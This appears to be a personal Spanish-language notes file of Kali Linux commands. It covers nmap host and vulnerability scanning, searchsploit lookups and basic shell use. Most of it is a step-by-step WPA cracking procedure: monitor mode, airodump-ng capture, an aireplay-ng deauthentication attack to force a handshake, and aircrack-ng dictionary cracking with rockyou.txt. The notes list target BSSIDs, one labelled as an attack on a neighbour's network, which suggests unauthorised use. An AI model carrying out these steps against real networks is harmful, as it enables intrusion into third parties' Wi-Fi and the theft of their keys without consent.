# kali
codigos para aplicacion de Linux, version Linux


sensible-browser




sudo airmon-ng 

airmon-ng start wlan0

airodump-ng wlan0

airodump-ng --bssid 1C:B0:44:BF:33:45 --channel 11 wlan0


ifconfig 

ping 192.168.1.91

nmap -sP 192.168.1.0/24 => es desde 0/24. 
Con eso saco las IP conectadas a la red

nmap -sT -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sS -p 80,443 nmap 192.168.1.0/24 => es desde 0/24

nmap -sT (IP) 

nmap -O (IP)

nmap -A (IP)

nmap -p- -sV (IP)
Se escanean los 65.535 puertos. 
Con esto obtengo las debilidades que son posible de explotar

searchsploit (se pega el programa obtenido en el paso anterior)
se busca si tiene algun backdoor con metaexploit

nmap --script vuln IP


ip iphone 192.168.1.83




min 10:00 Nmap tutorial to find networks vulnerabilities

man ls => Ayuda del comando
ls -l -a
pwd
cd /
uname -i
cd 
ls --file-type
ls --file-type -a -l 

Para abir archivos
less XXXXX.XXX 



Airmon
iwconfig => Mode:Managed, esto debe ser cambiado a modo monitor
la tarjeta debe estar en estado monitor
ifconfig wlan0
ifconfig wlan0 down => para dejar la tarjeta en modo monitor
airmon-ng check kill => congela todos los proceso de la tarjeta
airmon-ng start wlan0 => para comenzar el proceso, en modo monitor
iwconfig => confirmar que la tarjeta este en monitor mode
el adaptador debe soportar el modo de monitor
en monitor mode
airodump-ng wlan0 => Monitoreo de redes
airodump-ng -c1 -w capture -d BSSID wlan0 => the objective is knock station (access point) and achive the handshacke
guardando esta informacion en el archivo capture.cap
En segundo terminal colocar la siguiente linea
aireplay-ng --deauth 0 -a BSSID -c STATION wlan0 => Para hacer el handshake
Saldra PMKID found
Despues WPA Handshake

ls
el archivo mas importante es capture.cap
wireshark nombre archivo
filtrar por eapol

airmon-ng stop wlan0 
iwconfig
Para aplicar al dictionary
aircrack-ng capture-01.cap -w /usr/share/dict/wordlist-probable.txt
Probar con rockyou.txt, que se encuentra en /usr/share/wordlists/
Antes se debe descomprimir con gzip -d rockyou.txt.gz




Atacando al 810 =>7C:DB:98:E2:95:FC CH1
Atacando a la vecina => 18:70:3B:E6:FF:53 CH7
airodump-ng wlan0 => para rescatar BSSID y chanel
 


Instalando ATOM
dpkg -i atom-amd64(1).deb 
sudo apt --fix-broken install
sudo apt install -f




Para saber la arquitectura de un Linux
uname –m
If the response is i686, you have a 32-bit version of Linux.
If the response is x86_64, you have a 64-bit version of Linux.
uname –a
You can find out more detail about your particular installation of Linux, like your kernel version, by entering
Se debe instalar Kali Linux para 64 bits
	
